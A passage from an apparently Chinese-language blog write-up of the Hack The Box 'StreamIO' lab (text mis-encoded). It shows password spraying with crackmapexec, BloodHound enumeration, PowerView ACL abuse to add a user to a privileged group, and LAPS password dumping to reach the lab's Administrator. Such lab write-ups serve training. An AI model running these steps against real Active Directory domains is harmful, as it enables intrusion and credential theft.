class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:paddpadd@12 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:) STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.158    445    DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°è´¦å·å¯†ç ï¼š<code>streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r</code>ï¼Œä½†æ˜¯å¾—åˆ°äº†è¿™ç»„è´¦å·å¯†ç æˆ‘ä»¬ä»ç„¶æ— æ³•åˆ©ç”¨evil-winrmæˆåŠŸç™»å½•ã€‚ç”¨cmeçš„çˆ†ç ´ä¸€ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># crackmapexec winrm 10.10.11.158 -u user1 -p pass1 --continue-on-success</span></span><br><span class="line">SMB         10.10.11.158    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:streamIO.htb)</span><br><span class="line">HTTP        10.10.11.158    5985   DC               [*] http://10.10.11.158:5985/wsman</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\JDgodd:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\yoshihide:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\nikk37:JDg0dd1s@d0p3cr3@t0r</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:password@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:paddpadd@12</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:n1kk1sd0p3t00:)</span><br><span class="line">WINRM       10.10.11.158    5985   DC               [-] streamIO.htb\admin:JDg0dd1s@d0p3cr3@t0r</span><br></pre></td></tr></table></figure>

<p>ä¸éš¾å‘ç°ï¼ŒJDgoddè¿™ä¸ªè´¦æˆ·æˆ‘ä»¬æ²¡æ³•è¿œç¨‹ç™»å½•ã€‚é‚£åˆ©ç”¨bloodhound-pythonè¿œç¨‹æ”¶é›†ä¸€æ³¢ä¿¡æ¯å§ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># bloodhound-python -d streamio.htb -u JDgodd -p &quot;JDg0dd1s@d0p3cr3@t0r&quot;  -c All  -ns 10.10.11.158 -dc streamio.htb --zip </span></span><br><span class="line">INFO: Found AD domain: streamio.htb</span><br><span class="line">INFO: Getting TGT <span class="keyword">for</span> user</span><br><span class="line">WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</span><br><span class="line">INFO: Connecting to LDAP server: streamio.htb</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 1 domains <span class="keyword">in</span> the forest</span><br><span class="line">INFO: Found 1 computers</span><br><span class="line">INFO: Connecting to LDAP server: streamio.htb</span><br><span class="line">INFO: Found 8 <span class="built_in">users</span></span><br><span class="line">INFO: Found 54 <span class="built_in">groups</span></span><br><span class="line">INFO: Found 4 gpos</span><br><span class="line">INFO: Found 1 ous</span><br><span class="line">INFO: Found 19 containers</span><br><span class="line">INFO: Found 0 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line">INFO: Querying computer: DC.streamIO.htb</span><br><span class="line">INFO: Done <span class="keyword">in</span> 00M 20S</span><br><span class="line">INFO: Compressing output into 20231210133117_bloodhound.zip</span><br></pre></td></tr></table></figure>

<p>å¯¼å…¥åˆ°BloodHoundä¸­ï¼Œå¯ä»¥æ‰¾åˆ°è§£å†³åŠæ³•ï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fe0c458853aef5559a3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fe0c458853aef5559a3.jpg"></a></p>
<p>BloodHoundå‘Šè¯‰æˆ‘ä»¬å¯ä»¥ä½¿ç”¨PowerViewä¸­çš„Add-DomainObjectAclå‡½æ•°æ¥å‘core staffç»„ä¸­æ·»åŠ æˆå‘˜ã€‚æ¥ä¸‹æ¥æˆ‘ä»¬ç™»å½•åˆ°nikk37ï¼Œä¸Šä¼ powerviewå¹¶å¯¼å…¥ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload ../../../../../home/rainb0w/Tools/PowerSploit/Recon/PowerView.ps1  .</span><br><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure>

<p>å­˜å‚¨å‡­æ®ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$SecPassword</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;JDg0dd1s@d0p3cr3@t0r&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="string">&#x27;streamIO.htb\JDgodd&#x27;</span>, <span class="variable">$SecPassword</span>)</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡Add-DomainObjectAclèµ‹äºˆæ‰€æœ‰çš„æƒåŠ›ï¼Œå¹¶é€šè¿‡Add-DomainGroupMemberæ·»åŠ nikk37åˆ°CORE STAFFç»„ä¸­ï¼š</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;CORE STAFF&quot;</span> <span class="literal">-Rights</span> All <span class="literal">-PrincipalIdentity</span> JDgodd</span><br><span class="line"><span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&#x27;CORE STAFF&#x27;</span> <span class="literal">-Members</span> <span class="string">&#x27;nikk37&#x27;</span> <span class="literal">-Cred</span> <span class="variable">$Cred</span></span><br></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥å¯ä»¥åˆ©ç”¨è¿™ç¯‡æ–‡ç« ï¼š<a target="_blank" rel="noopener" href="https://www.hackingarticles.in/credential-dumpinglaps/">https://www.hackingarticles.in/credential-dumpinglaps/</a> ä¸­ä»‹ç»çš„æ–¹æ³•å»dump lapså‡­æ®ï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec ldap 10.10.11.158 -u nikk37 -p <span class="string">&#x27;get_dem_girls2@yahoo.com&#x27;</span> â€“kdcHost 10.10.11.158 -M laps</span><br><span class="line"></span><br><span class="line">ldapsearch -x -H ldap://10.10.11.158 -D nikk37@streamio.htb -w <span class="string">&quot;get_dem_girls2@yahoo.com&quot;</span> -b <span class="string">&quot;dc=streamio,dc=htb&quot;</span> <span class="string">&quot;(ms-MCs-admpwd=*)&quot;</span>|grep ms-Mcs-AdmPwd</span><br></pre></td></tr></table></figure>

<p>æœ€ååˆ©ç”¨å¾—åˆ°çš„å¯†ç ç™»å½•åˆ°Administratorï¼Œæ‹¿åˆ°Root Flagï¼š</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/65760fedc458853aef557252.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/65760fedc458853aef557252.jpg"></a></p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>è¿™é“é¶æœºå¹¶ä¸å›°éš¾ï¼Œåªæ˜¯è€ƒç‚¹æ¯”è¾ƒå¤šï¼Œå› æ­¤æ‰“èµ·æ¥ä¹Ÿæ„Ÿåˆ°æ¯”è¾ƒç¹çè´¹åŠ›ï¼Œå› æ­¤ä¸ªäººè®¤ä¸ºè¿˜æ˜¯å€¼å¾—Mediuméš¾åº¦ã€‚</p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Articles</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">å‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetShell"><span class="toc-number">2.</span> <span class="toc-text">GetShell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GetAdministrator"><span class="toc-number">3.</span> <span class="toc-text">GetAdministrator</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">æ€»ç»“</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.rainb0w.top/2023/12/10/htbStreamIO/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&text=[hackthebox]StreamIO WriteUp"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&is_video=false&description=[hackthebox]StreamIO WriteUp"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=[hackthebox]StreamIO WriteUp&body=Check out this article: https://blog.rainb0w.top/2023/12/10/htbStreamIO/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&title=[hackthebox]StreamIO WriteUp"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&name=[hackthebox]StreamIO WriteUp&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.rainb0w.top/2023/12/10/htbStreamIO/&t=[hackthebox]StreamIO WriteUp"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    1970-2099
    rainb0w
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Articles</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'r4inb00w/r4inb00w.github.io';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
